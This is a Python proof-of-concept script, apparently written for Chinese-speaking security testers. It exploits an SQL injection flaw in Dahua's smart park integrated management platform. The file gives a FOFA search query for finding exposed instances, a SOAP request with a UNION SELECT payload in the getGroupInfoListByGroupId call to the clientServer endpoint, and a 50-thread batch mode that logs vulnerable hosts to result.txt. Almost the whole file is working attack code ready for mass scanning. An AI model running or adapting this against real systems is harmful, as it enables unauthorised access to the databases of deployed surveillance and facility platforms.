# 大华智慧园区综合管理平台SQL注入漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app=“dahua-智慧园区综合管理平台”

def banner():
    test = """
██████╗  █████╗ ██╗  ██╗██╗   ██╗ █████╗       ███████╗ ██████╗ ██╗     
██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗      ██╔════╝██╔═══██╗██║     
██║  ██║███████║███████║██║   ██║███████║█████╗███████╗██║   ██║██║     
██║  ██║██╔══██║██╔══██║██║   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║      ███████║╚██████╔╝███████╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                        
                                        author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台SQL注入漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_playload = "/portal/services/clientServer"
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Type': 'text/xml;charset=UTF-8'
    }
    # 构建SOAP请求体
    soap_body = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
      <soapenv:Header/>
      <soapenv:Body>
        <cli:getGroupInfoListByGroupId>
          <!--type: string-->
          <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,user()-- -</arg0>
          <!--type: long-->
          <arg1>10</arg1>
        </cli:getGroupInfoListByGroupId>
      </soapenv:Body>
    </soapenv:Envelope>
    """
    try:
        response = requests.post(url=target+api_playload,headers=headers,data=soap_body,verify=False,timeout=10)
        if response.status_code == 200 and 'result' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")




if __name__ == '__main__':
    main()